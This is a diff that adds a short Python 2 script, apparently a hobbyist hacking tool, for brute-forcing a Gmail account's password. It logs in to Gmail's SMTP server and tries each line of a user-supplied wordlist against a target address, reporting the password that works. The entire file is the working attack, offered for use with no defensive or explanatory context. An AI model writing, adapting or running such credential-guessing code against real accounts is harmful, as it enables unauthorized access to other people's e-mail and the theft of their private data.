@@ -1,0 +1,32 @@
+
+import smtplib
+
+print "                                        "
+print "########################################"
+print "##                                    ##"
+print "##     Programmed by Ilke Toprak      ##"
+print "##                                    ##"
+print "##         October 31, 2017           ##"
+print "##                                    ##"
+print "##         Nocopyright 2017           ##"
+print "##                                    ##"
+print "########################################"
+print "                                        "
+
+smtpserver = smtplib.SMTP("smtp.gmail.com" ,587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+
+user = raw_input("Enter the target's e-mail: ")
+passwfile = raw_input ("Enter the password file: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile :
+        try :
+
+                 smtpserver.login(user, password)
+                 print ("[+] Password Found ===>  %s") % password
+                 break;
+        except smtplib.SMTPAuthenticationError:
+                print ("[-] Password is incorrect ===> %s ") % password
